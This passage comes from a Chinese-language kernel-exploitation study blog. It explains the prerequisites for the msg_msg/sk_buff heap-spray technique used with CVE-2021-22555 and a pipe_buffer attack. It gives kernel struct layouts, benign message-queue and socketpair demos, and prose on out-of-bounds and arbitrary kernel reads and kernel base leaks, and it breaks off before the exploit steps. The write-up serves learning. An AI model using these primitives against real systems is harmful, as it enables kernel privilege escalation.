<p>大佬使用了 CVE-2021-22555 的堆喷 <code>msg_msg</code> 与 <code>sk_buff</code> 的解法，在学习这个方法之前需要一些前置知识：</p>
<hr>
<p><strong>msg_msg</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>当我们在一个消息队列上发送多个消息时，会形成如下结构：（msg 双向链表）</p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656410685806-1663329194251.png" alt="1656410685806"> </p>
<ul>
<li>消息队列，Unix 的通信机制之一，可以理解为是一个存放消息（数据）容器</li>
<li>将消息写入消息队列，然后再从消息队列中取消息，一般来说是先进先出 FIFO 的顺序 </li>
</ul>
<p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体 <strong>其大小是可以随着消息大小的改变而进行变动的</strong>：</p>
<ul>
<li>去除掉 <code>msg_msg</code> 结构体本身的 0x30 字节的部分（或许可以称之为 header）剩余的部分都用来存放用户数据</li>
<li>因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的 </li>
</ul>
<p>而当我们单次发送大于 [一个页面大小 - header size] 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体（只有一个 next 指针），其与 <code>msg_msg</code> 之间形成如下单向链表结构： </p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656567331153-1663329194251.png" alt="1656567331153">  </p>
<ul>
<li>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体 </li>
<li>在读取 <code>msg_msg</code> 中的数据时，如果 <code>msg_msg-&gt;next</code> 不为空，程序就会把 <code>msg_msg-&gt;next</code> 指向的内容也当做是 <code>msg_msg data</code> 的一部分，如果 <code>msg_msgseg-&gt;next</code> 还不为空，就会继续读取 <code>msg_msgseg-&gt;next</code> 指向的内容</li>
</ul>
<p>利用：</p>
<ul>
<li>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，若是我们能够控制一个 msg_msg 的 header，将其 <code>msg_msg-&gt;m_ts</code> 成员改为一个较大的数，我们就能够越界读取出最多将近一张内存页大小的数据</li>
<li>若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们便能够完成内核空间中的任意地址读（<code>msg_msg-&gt;next</code> 指向的数据也会被当做 <code>msg_msg data</code>）<ul>
<li>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，我们需要保证该地址的数据为 NULL</li>
</ul>
</li>
</ul>
<p>相关接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将消息发送到消息队列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从消息队列获取消息</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查看、设置、删除ipc内核对象(用法和shmctl一样)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：消息队列的标识符，代表要从哪个消息列中获取消息</li>
<li>msgp： 存放消息结构体的地址（需要自己定义：<code>long type+char data[n]</code>）</li>
<li>msgsz：消息正文的字节数</li>
<li>msgtyp：消息的类型，可以有以下几种类型：<ul>
<li>msgtyp = 0：返回队列中的第一个消息</li>
<li>msgtyp &gt; 0：返回队列中消息类型为 msgtyp 的消息（常用）</li>
<li>msgtyp &lt; 0：返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li>
</ul>
</li>
<li>msgflg：函数的控制属性，其取值如下：<ul>
<li>0：msgrcv() 调用阻塞直到接收消息成功为止</li>
<li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li>
<li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li>
</ul>
</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> type;      </span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">128</span>]; </span><br><span class="line">&#125;MSG_T;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">key_t</span> key;</span><br><span class="line">    <span class="keyword">int</span> msgid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    MSG_T s_msg, r_msg;</span><br><span class="line"></span><br><span class="line">    key=ftok(<span class="string">&quot;.&quot;</span>,<span class="number">66</span>); <span class="comment">// key_t ftok(const char *pathname, int proj_id) 获取键值key</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ftok success key:0x%x\n&quot;</span>, key);</span><br><span class="line"></span><br><span class="line">    msgid = msgget(key,<span class="number">0666</span> | IPC_CREAT); <span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;msgget success msgid:%d\n&quot;</span>, msgid);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;ipcs -q&quot;</span>); <span class="comment">// 通过shell指令&quot;ipcs -q&quot;可以查看消息队列的信息</span></span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123; <span class="comment">/* 父进程,发送消息 */</span></span><br><span class="line">        s_msg.type = <span class="number">0x41</span>;</span><br><span class="line">        <span class="built_in">memset</span>(s_msg.data, <span class="number">0</span>, <span class="keyword">sizeof</span>(s_msg.data));</span><br><span class="line">        <span class="built_in">strncpy</span>(s_msg.data, <span class="string">&quot;yhellow_chunk&quot;</span>, <span class="number">0x20</span>);</span><br><span class="line">        msgsnd(msgid, &amp;s_msg, <span class="built_in">strlen</span>(s_msg.data), <span class="number">0</span>); <span class="comment">// 将消息发送到消息队列</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 停止目前进程的执行,直到有信号来到或子进程结束</span></span><br><span class="line">        msgctl(msgid, IPC_RMID, <span class="literal">NULL</span>); <span class="comment">// 删除ipc内核对象</span></span><br><span class="line">        system(<span class="string">&quot;ipcs -q&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">/* 子进程,接收消息 */</span></span><br><span class="line">        msgrcv(msgid, &amp;r_msg, <span class="keyword">sizeof</span>(r_msg.data), <span class="number">0x41</span>, IPC_NOWAIT); <span class="comment">// 从消息队列取出消息后,并将其从消息队列里删除</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv msg data type: %ld, data: %s\n&quot;</span>, r_msg.type, r_msg.data);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test               </span><br><span class="line">ftok success key:<span class="number">0x4205274f</span></span><br><span class="line">msgget success msgid:<span class="number">15</span></span><br><span class="line"></span><br><span class="line">--------- 消息队列 -----------</span><br><span class="line">键        msqid      拥有者  权限     已用字节数 消息      </span><br><span class="line"><span class="number">0x4205274f</span> <span class="number">15</span>         yhellow    <span class="number">666</span>        <span class="number">0</span>            <span class="number">0</span>           </span><br><span class="line"></span><br><span class="line">recv msg data type: <span class="number">65</span>, data: yhellow_chunk</span><br><span class="line"></span><br><span class="line">--------- 消息队列 -----------</span><br><span class="line">键        msqid      拥有者  权限     已用字节数 消息</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/528829665">Linux内核消息队列详解</a></p>
<p><strong>socketpair</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socketpair</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, <span class="keyword">int</span> sv[<span class="number">2</span>])</span>；</span></span><br></pre></td></tr></table></figure>
<ul>
<li>socketpair() 函数用于创建一对无名的、相互连接的套接子（有点类似于管道）</li>
<li>如果函数成功，则返回 “0”，创建好的套接字分别是 sv[0] 和 sv[1]</li>
<li>否则返回 “-1”，错误码保存于 errno 中</li>
</ul>
<p>基本用法： </p>
<ul>
<li>这对套接字可以用于全双工通信，每一个套接字既可以读也可以写（例如，可以往 sv[0] 中写，从 sv[1] 中读，或者从 sv[1] 中写，从 sv[0] 中读）</li>
<li>如果往一个套接字（sv[0]）中写入后，再从该套接字读时会阻塞，只能在另一个套接字中（sv[1]）上读成功</li>
<li>读、写操作可以位于同一个进程，也可以分别位于不同的进程，如父子进程，如果是父子进程时，一般会功能分离，一个进程用来读，一个用来写（因为文件描述副 sv[0] 和 sv[1] 是进程共享的，所以读的进程要关闭写描述符，反之，写的进程关闭读描述符）</li>
</ul>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;error.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socket_pair[<span class="number">2</span>][<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">pid_t</span> pid; </span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">char</span>* str = <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    <span class="built_in">memset</span>(str, <span class="string">&#x27;a&#x27;</span>, <span class="number">0X20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_pair[i]) == <span class="number">-1</span> ) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error, socketpair create failed, errno(%d): %s\n&quot;</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size = write(socket_pair[<span class="number">0</span>][<span class="number">0</span>], str, <span class="built_in">strlen</span>(str)); <span class="comment">/* 写入socket_pair[0][0] */</span> </span><br><span class="line">    size = write(socket_pair[<span class="number">1</span>][<span class="number">0</span>], str, <span class="built_in">strlen</span>(str)); <span class="comment">/* 写入socket_pair[1][0] */</span> </span><br><span class="line"></span><br><span class="line">    read(socket_pair[<span class="number">0</span>][<span class="number">1</span>], buf, size); <span class="comment">/* 从socket_pair[0][1]中读入buf */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf result1: %s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(str, <span class="string">&#x27;b&#x27;</span>, <span class="number">0X20</span>); <span class="comment">/* 更改原来str中的数据 */</span></span><br><span class="line">    read(socket_pair[<span class="number">1</span>][<span class="number">1</span>], buf, size); <span class="comment">/* 从socket_pair[1][1]中读入buf */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf result2: %s\n&quot;</span>,buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">buf result1: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">buf result2: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现原 str 改变以后，buf 并没有改变，也就是说 socketpair 底层的存储方式不是指针，数据传入 <code>socket_pair[0-1][1]</code> 时就被复制了一份</li>
<li>那么 <code>socket_pair[0-1][1]</code> 中的数据是储存到哪里的呢？</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffb73d</span> <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffde00</span> <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line">pwndbg&gt; search -s bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">[heap]          <span class="number">0x4052a0</span> <span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>heap 上没有，那就极有可能在 kernel heap 中</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013">socketpair的用法和理解</a> </p>
<p><strong>sk_buff</strong></p>
<p>结构体 <code>sk_buff</code> 的源码很长，但这里我们只需要注意以下片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* These two members must be first. */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">next</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">prev</span>;</span></span><br><span class="line">            ......</span><br><span class="line">	&#125;;</span><br><span class="line">	......</span><br><span class="line">    <span class="keyword">sk_buff_data_t</span>      tail; <span class="comment">/*指向数据区中实际数据结束的位置*/</span></span><br><span class="line">    <span class="keyword">sk_buff_data_t</span>      end; <span class="comment">/*指向数据区中结束的位置（非实际数据区域结束位置）*/</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>       *head, <span class="comment">/* 指向数据区中开始的位置（非实际数据区域开始位置）*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>       *data; <span class="comment">/*指向数据区中实际数据开始的位置*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        truesize; </span><br><span class="line">	<span class="keyword">refcount_t</span>		users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>		*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<ul>
<li><code>sk_buff</code>（socket buffer）结构是 linux 网络代码中重要的数据结构，它<strong>管理和控制接收或发送数据包的信息</strong></li>
<li>类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是：<ul>
<li><code>msg_msg</code> 由一个 header 加上用户数据组成</li>
<li>而 <code>sk_buff</code> 本身不包含任何用户数据，用户数据单独存放在一个 object 当中，而 <code>sk_buff</code> 中存放指向用户数据的指针</li>
</ul>
</li>
</ul>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656479312235-1663329194251.png" alt="1656479312235"> </p>
<ul>
<li>sk_buff 在内核网络协议栈中代表一个「包」，我们只需要<strong>创建一对 socke，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong></li>
<li>最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</li>
</ul>
<p><strong>pipe_buffer</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </li>
<li>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址</li>
</ul>
<hr>
<p>PS：因为本人太菜，所以第一遍只能跟着大佬的 exp 做阅读理解……</p>
<p><strong>Step.I 堆喷 msg_msg，建立主从消息队列</strong></p>
